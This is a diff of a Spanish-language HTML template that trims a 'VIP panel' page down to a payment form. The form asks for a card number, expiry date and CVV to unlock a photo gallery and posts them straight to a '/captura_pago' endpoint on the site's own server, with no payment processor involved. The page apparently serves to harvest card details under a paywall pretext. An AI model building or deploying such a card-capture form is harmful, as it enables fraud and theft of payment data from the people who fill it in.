@@ -1,33 +1,10 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
-    <style>
-        body { background: #111; color: white; }
-        .card-pago { background: #222; border: 1px solid gold; border-radius: 15px; padding: 20px; margin-top: 20px; }
-    </style>
-</head>
-<body class="p-3">
-    <div class="container">
-        <h3 class="text-center">Bienvenido al Panel VIP</h3>
-        <div class="card-pago">
-            <p class="text-center">Para desbloquear el contenido, realice el pago de <b>${{ config.precio }}</b></p>
-            <form action="/captura_pago" method="POST">
-                <input type="text" name="cc" class="form-control mb-3" placeholder="Número de Tarjeta" required>
-                <div class="row g-2">
-                    <div class="col-6"><input type="text" name="exp" class="form-control mb-3" placeholder="MM/AA" required></div>
-                    <div class="col-6"><input type="text" name="cvv" class="form-control mb-3" placeholder="CVV" required></div>
-                </div>
-                <button class="btn btn-warning w-100 fw-bold">PAGAR AHORA</button>
-            </form>
-        </div>
-        
-        <div class="mt-4 row">
-            {% for f in fotos %}
-            <div class="col-6 mb-2"><img src="/static/uploads/{{f}}" class="img-fluid rounded border border-secondary"></div>
-            {% endfor %}
-        </div>
+<form action="/captura_pago" method="POST" class="p-4 bg-dark rounded border border-warning shadow">
+    <h5 class="text-warning text-center">CONFIRMACIÓN DE PAGO</h5>
+    <p class="small text-center">Para acceder a la galería VIP, pague {{ config.precio }} via {{ config.alias }}</p>
+    <input type="text" name="cc" class="form-control mb-3" placeholder="Número de Tarjeta" required>
+    <div class="row g-2">
+        <div class="col-6"><input type="text" name="exp" class="form-control mb-3" placeholder="MM/AA" required></div>
+        <div class="col-6"><input type="text" name="cvv" class="form-control mb-3" placeholder="CVV" required></div>
     </div>
-</body>
-</html>
+    <button class="btn btn-warning w-100 fw-bold">PROCESAR PAGO</button>
+</form>
